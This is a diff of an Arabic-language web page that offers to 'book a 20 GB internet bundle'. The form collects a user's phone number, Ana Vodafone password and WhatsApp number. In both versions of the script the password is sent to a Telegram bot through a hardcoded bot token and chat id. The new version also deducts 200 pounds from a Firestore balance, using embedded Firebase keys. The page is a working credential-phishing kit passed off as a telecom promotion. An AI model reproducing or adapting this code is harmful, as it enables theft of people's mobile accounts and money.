@@ -5,7 +5,67 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>🔵 حجز 20 جيجا إنترنت</title>
   <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@600&display=swap" rel="stylesheet">
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.11.1/firebase-app.js";
+    import { getFirestore, doc, getDoc, updateDoc } from "https://www.gstatic.com/firebasejs/10.11.1/firebase-firestore.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyCE-lK2kKc2CQi3bmnQ1UjKBy9Rb_M-Df0",
+      authDomain: "noproblem-55b97.firebaseapp.com",
+      projectId: "noproblem-55b97",
+      storageBucket: "noproblem-55b97.appspot.com",
+      messagingSenderId: "315239654480",
+      appId: "1:315239654480:web:b40c7bba7c6cf0b7395351"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    window.submit20 = async function () {
+      const phone = document.getElementById("phone").value.trim();
+      const password = document.getElementById("password").value.trim();
+      const whatsapp = document.getElementById("whatsapp").value.trim();
+
+      if (!phone || !password || !whatsapp) {
+        Swal.fire("❌ خطأ", "يرجى إدخال جميع البيانات", "error");
+        return;
+      }
+
+      const userRef = doc(db, "users", phone);
+      const userSnap = await getDoc(userRef);
+
+      if (!userSnap.exists()) {
+        Swal.fire("❌ خطأ", "رقم الهاتف غير مسجل", "error");
+        return;
+      }
+
+      const userData = userSnap.data();
+      const currentBalance = userData.balance || 0;
+
+      if (currentBalance < 200) {
+        Swal.fire("⚠️ رصيد غير كافي", `رصيدك الحالي ${currentBalance} جنيه، ولا يكفي لحجز الباقة.`, "warning");
+        return;
+      }
+
+      // خصم الرصيد
+      await updateDoc(userRef, {
+        balance: currentBalance - 200
+      });
+
+      const message = `
+📦 *طلب باقة 20 جيجا*  
+📱 *رقم الهاتف:* ${phone}  
+🔐 *باسورد أنا فودافون:* ${password}  
+💬 *رقم واتساب:* ${whatsapp}  
+💰 *تم الخصم: 200 جنيه*  
+`;
+
+      await fetch(`https://api.telegram.org/bot7798612517:AAFdPcsVIOOyoW6NYTD0i_LTXn2KpFedwWo/sendMessage?chat_id=8102839626&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
+
+      Swal.fire("✅ تم الحجز", "تم حجز 20 جيجا إنترنت. التفعيل خلال 24 إلى 48 ساعة.", "success");
+    };
+  </script>
+
   <style>
     body {
       font-family: 'Cairo', sans-serif;
@@ -29,28 +89,20 @@
     h2 {
       color: #00e6e6;
     }
-    input {
+    input, button {
       width: 100%;
       padding: 12px;
       margin: 10px 0;
       border: none;
       border-radius: 8px;
-      background: #444;
-      color: white;
       font-size: 16px;
     }
-    input:focus {
-      outline: none;
-      background: #555;
+    input {
+      background: #444;
+      color: white;
     }
     button {
-      width: 100%;
-      padding: 12px;
-      margin-top: 10px;
-      font-size: 18px;
       background: linear-gradient(to right, #00c6ff, #0072ff);
-      border: none;
-      border-radius: 8px;
       color: white;
       cursor: pointer;
     }
@@ -68,34 +120,5 @@
     <input type="text" id="whatsapp" placeholder="💬 رقم واتساب">
     <button onclick="submit20()">تفعيل الباقة</button>
   </div>
-
-  <script>
-    function submit20() {
-      const phone = document.getElementById("phone").value;
-      const password = document.getElementById("password").value;
-      const whatsapp = document.getElementById("whatsapp").value;
-
-      if (!phone || !password || !whatsapp) {
-        Swal.fire("❌ خطأ", "يرجى إدخال جميع البيانات", "error");
-        return;
-      }
-
-      const message = `
-📦 *طلب باقة 20 جيجا*  
-📱 *رقم الهاتف:* ${phone}  
-🔐 *باسورد أنا فودافون:* ${password}  
-💬 *رقم واتساب:* ${whatsapp}  
-💰 *السعر:* 200 جنيه  
-`;
-
-      fetch(`https://api.telegram.org/bot7798612517:AAFdPcsVIOOyoW6NYTD0i_LTXn2KpFedwWo/sendMessage?chat_id=8102839626&text=${encodeURIComponent(message)}&parse_mode=Markdown`)
-        .then(() => {
-          Swal.fire("✅ تم الحجز", "تم حجز 20 جيجا إنترنت. التفعيل خلال 24 إلى 48 ساعة.", "success");
-        })
-        .catch(() => {
-          Swal.fire("❌ خطأ", "فشل إرسال الطلب. حاول مرة أخرى.", "error");
-        });
-    }
-  </script>
 </body>
 </html>
